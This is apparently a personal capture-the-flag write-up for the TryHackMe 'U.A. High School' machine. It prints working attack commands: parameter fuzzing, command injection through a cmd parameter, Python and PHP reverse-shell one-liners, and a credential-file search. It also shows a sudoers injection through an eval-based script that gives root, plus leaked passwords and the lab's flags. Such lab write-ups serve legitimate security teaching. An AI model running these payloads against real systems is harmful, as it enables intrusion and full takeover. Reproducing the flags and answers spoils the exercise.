---

# TryHackMe: U.A. High School Walkthrough

Hello once again people.  
Today I’m completing the **U.A. High School** machine on TryHackMe! :D  
I mean, the anime *My Hero Academia* is alright, but let’s hope this machine is better then, shall we?

---

## 🏫 U.A. High School - Introduction

**Welcome to the web application of U.A., the Superhero Academy.**  
Join us in the mission to protect the digital world of superheroes!

> U.A., the most renowned Superhero Academy, is looking for a superhero to test the security of our new site.  
> Our site is a reflection of our school values, designed by our engineers with incredible Quirks.  
> We have gone to great lengths to create a secure platform that reflects the exceptional education of the U.A.

---

## 🔍 Nmap Scan

Per usual, let’s kick things off with an **nmap** scan:

```bash
nmap -sV -A 10.10.171.129
````

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)

OS: Linux 4.15
```

> Well well well... so it’s the typical HTTP and SSH — nothing too fancy.

---

## 📁 Dirsearch Enumeration

### First run:

```bash
dirsearch -u http://10.10.171.129/
```

**Findings:**

* `/about.html` - 200 OK
* `/contact.html` - 200 OK
* `/assets/` - 200 OK

> Dirsearch reveals an assets directory. Let’s enumerate this further.

---

## 🔍 Dirsearch on `/assets`

```bash
dirsearch -u http://10.10.171.129/assets
```

**Findings:**

* 403s on lots of hidden files like `.htaccess`, `.php`, `.html`, etc.
* `/assets/images` - 301 Redirect → exists!

> Still nothing. Let’s use a bigger wordlist.

---

## 🧱 Bigger Wordlist Attempt

```bash
dirsearch -u http://10.10.171.129/assets -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

> Man, still nothing?

---

## 🖼️ Checking `/assets/images`

```bash
dirsearch -u http://10.10.171.129/assets/images
```

> Given there's a `.php` thing here maybe there is an `index.php`?

---

## 📜 Trying index.php

Okay, so I got stuck and had to refer to a writeup (TryHackMe: U.A. High School | jaxafed).
This is from the writeup:

### Fuzz for Parameters

```bash
ffuf -u 'http://10.10.171.129/assets/index.php?FUZZ=id' \
     -mc all -ic -t 100 \
     -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt \
     -fs 0
```

**Findings:**

```
cmd [Status: 200, Size: 72]
```

> With this, we discover the `cmd` parameter, and making the same request with curl, we get a base64 encoded response.

---

## 🔧 Command Execution

```bash
curl -s 'http://10.10.171.129/assets/index.php?cmd=id'
```

**Response:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
curl -s 'http://10.10.171.129/assets/index.php?cmd=whoami'
```

**Response:**

```
www-data
```

> Okay nice!

---

## 🐚 Reverse Shell Attempt

```bash
http://10.10.171.129/assets/index.php?cmd=python3%20-c%20'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR IP",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
```

> LMAO guys while doing this my time on the machine expired and I had no idea why the reverse shell wasn’t working uhhhh hehehe.

---

## 🛠️ Alternative Shell (That Works!)

```bash
http://10.10.171.129/assets/index.php?cmd=php%20-r%20'%24sock=fsockopen("YOUR IP",1234);exec("bash <&3 >&3 2>&3");'
```

### On local machine:

```bash
nc -lvnp 1234
```

**Output:**

```
connect to [your IP] from (UNKNOWN) [10.10.104.145] 49990
```

### Files inside the shell:

```bash
ls
images
index.php
styles.css
```

---

## ⬆️ Shell Upgrade

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

> There you go guys, that’s how you get a nice-looking shell 😎

---

# 🏠 Exploring Home Directory

```bash
cd /home
ls
```

**Output:**

```
deku
```

```bash
cd deku
ls
```

**Output:**

```
user.txt
```

```bash
cat user.txt
```

**Result:**

```
cat: user.txt: Permission denied
```

**Ahem excuse me?**

---

# 🔍 Hunting for Passwords

```bash
grep -iR pass
```

**Result:**

Most logs returned:

```
Permission denied
```

**BUT... some logs gave us output!**

* `/var/cache/apt/archives/partial/passwd_...deb`
* `base-passwd`, `passwd` packages and... wait for it...

---

# 🎯 Jackpot: A Hidden File

```bash
find / -type f \( -iname "*pass*" -o -iname "*cred*" -o -iname "*.env" \) 2>/dev/null
```

**Result:**

```
...
/var/www/Hidden_Content/passphrase.txt
...
```

**Woah woah woah do you guys see that?!? `passphrase.txt`!!**

```bash
cat /var/www/Hidden_Content/passphrase.txt
```

**Output:**

```
QWxsbWlnaHRGb3JFdmVyISEhCg==
```

### 🧠 Decode that base64:

```bash
echo 'QWxsbWlnaHRGb3JFdmVyISEhCg==' | base64 -d
```

**Result:**

```
AllmightForEver!!!
```

---

# 🔐 Trying to su into Deku

```bash
su deku
Password: AllmightForEver!!!
```

**Result:**

```
su: Authentication failure
```

**NOO WHYYYY ugh…**

---

# 🖼 Investigating Web Files

Found an unused image:

```bash
cd /var/www/html/assets/images
ls -la
```

**Found:**

* `oneforall.jpg`
* `yuei.jpg`

### 🔽 Download it

```bash
wget http://10.10.104.145/assets/images/oneforall.jpg
```

---

# 🔍 Stego Time!

```bash
steghide extract -sf oneforall.jpg
```

**Enter passphrase:** `AllmightForEver!!!`

**BUT:**

```
steghide: the file format of the file "oneforall.jpg" is not supported.
```

### 🧬 Check file header:

```bash
xxd oneforall.jpg | head
```

**Uh what? It's actually a PNG?!**

### 🛠 Fix it with hexeditor:

```bash
hexeditor -b oneforall.jpg
```

Change the first few bytes to:

```
FF D8 FF E0 ...
```

(Valid JPEG header)

---

# ✅ Now Try Steghide Again

```bash
steghide extract -sf oneforall.jpg
```

**Enter passphrase:** `AllmightForEver!!!`

**Result:**

```
wrote extracted data to "creds.txt"
```

### 📄 View the contents

```bash
cat creds.txt
```

**Output:**

```
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

---

# 📡 SSH Into Deku's Account

```bash
ssh deku@10.10.104.145
```

**Password:** `One?For?All_!!one1/A`

✅ **Login Successful**

---

# 🏆 Get the User Flag

```bash
cat user.txt
```

**Flag:**

```
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
```

---

# 🔎 Check for Sudo Privileges

```bash
sudo -l
```

**Output:**

```
(ALL) /opt/NewComponent/feedback.sh
```

---

# 📜 View the Script

```bash
cat /opt/NewComponent/feedback.sh
```

```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback

if [[ "$feedback" != *"\"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"
fi
```

---
## ⚙️ What the Script Does

* Prompts the user for feedback.
* Uses `eval "echo $feedback"` to evaluate and print the user input.
* Appends the input to `/var/log/feedback.txt`.

Although it filters some dangerous characters, **it fails to catch all potentially dangerous input**.

---

## 💥 The Exploit

If you run the script with `sudo`:

```bash
sudo /opt/NewComponent/feedback.sh
```

You can enter the following as input:

```bash
deku ALL=NOPASSWD: ALL >> /etc/sudoers
```

This input is evaluated as:

```bash
eval "echo deku ALL=NOPASSWD: ALL >> /etc/sudoers"
```

Which becomes:

```bash
echo deku ALL=NOPASSWD: ALL >> /etc/sudoers
```

Since the script is running as root, this command appends a **privilege escalation line** into the real sudo configuration file:

```bash
deku ALL=NOPASSWD: ALL
```

---

## 🔓 What This Means

> The user `deku` is now allowed to execute any command as root **without a password**.

You can now run:

```bash
sudo /bin/bash
```

And get a root shell instantly:

```bash
root@myheroacademia:/home/deku# cat /root/root.txt
```

---

## 🏁 Final Result

Upon reading `/root/root.txt`:

```bash
THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
```

---

Thanks for reading!!!
Credits to **Jaxafed** and their writeup I had to use a few times: 
https://jaxafed.github.io/posts/tryhackme-ua_high_school/



